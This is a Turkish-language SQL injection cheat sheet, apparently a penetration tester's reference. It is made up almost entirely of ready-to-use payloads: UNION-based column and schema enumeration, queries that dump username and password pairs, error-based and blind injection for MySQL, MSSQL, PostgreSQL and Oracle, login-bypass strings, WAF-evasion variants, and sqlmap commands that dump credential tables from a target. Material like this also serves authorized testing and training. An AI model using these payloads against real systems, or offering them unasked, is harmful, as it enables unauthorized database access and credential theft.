# SQL Injection

## SQLi Tespiti
```sql
'
"
```

## UNION SQLi
### Sütun Sayısı Tespiti
```sql
'ORDER BY 1 --
'ORDER BY 2 --
'UNION SELECT NULL, NULL --
'UNION SELECT NULL, NULL --
```
### Sütun Tipini Doğrulama (hangi sütun string kabul ediyor)
```sql
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

## Veritabanı Bilgisi
```sql
' UNION SELECT @@version,NULL--          -- MySQL/MSSQL
' UNION SELECT version(),NULL--          -- PostgreSQL
' UNION SELECT current_database(),NULL-- -- PostgreSQL
' UNION SELECT database(),NULL--         -- MySQL
' UNION SELECT current_user,NULL--
```

## Tablo/Sütun İsimlerini Çekme
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--   -- MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--      -- PostgreSQL
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Veri Çekme
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT username || ':' || password, NULL FROM users--          -- PostgreSQL concat
' UNION SELECT CONCAT(username,':',password), NULL FROM users--        -- MySQL concat
' UNION SELECT GROUP_CONCAT(username,':',password), NULL FROM users--  -- MySQL, tüm satırlar tek hücrede
' UNION SELECT string_agg(username||':'||password, ','), NULL FROM users--  -- PostgreSQL, tüm satırlar tek hücrede
```

## Error-based SQLi
### MySQL
```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```
### MSSQL
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS int)--
```
### Oracle
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

## Blind SQLi
### Boolean-based
```sql
' AND 1=1--          -- true, sayfa normal
' AND 1=2--          -- false, sayfa farklı/boş
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```
### Time-based
```sql
' AND SLEEP(5)--                          -- MySQL
'; WAITFOR DELAY '0:0:5'--                -- MSSQL
' AND (SELECT pg_sleep(5))--              -- PostgreSQL
' AND EXTRACTVALUE(1,IF(1=1,SLEEP(5),0))--  -- koşullu, MySQL
```

## Kimlik Doğrulama Bypass
```sql
admin'--
admin' #
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
```

## WAF / Filtre Atlatma
```sql
/*!UNION*/ /*!SELECT*/ NULL,NULL--     -- MySQL inline comment ile
UNI/**/ON SEL/**/ECT NULL,NULL--       -- anahtar kelime arasına yorum
' UnIoN SeLeCt NULL,NULL--             -- case değiştirme
' UNION%0aSELECT NULL,NULL--           -- boşluk yerine newline
%27 OR 1=1--                           -- URL encode tek tırnak
```

## Veritabanına Özel Hızlı Referans
| İşlem | MySQL | PostgreSQL | MSSQL |
|---|---|---|---|
| Versiyon | `@@version` | `version()` | `@@version` |
| Mevcut DB | `database()` | `current_database()` | `DB_NAME()` |
| String birleştirme | `CONCAT(a,b)` | `a \|\| b` | `a + b` |
| Yorum satırı | `-- ` / `#` | `-- ` | `-- ` |
| Gecikme fonksiyonu | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` |

## sqlmap Hızlı Komutlar
```bash
sqlmap -u "https://hedef.com/urun?id=1" --batch
sqlmap -u "https://hedef.com/urun?id=1" --dbs
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani --tables
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani -T users --columns
sqlmap -u "https://hedef.com/urun?id=1" -D veritabani -T users -C username,password --dump
sqlmap -r request.txt --batch    # Burp'ten kaydedilmiş request dosyasıyla
```
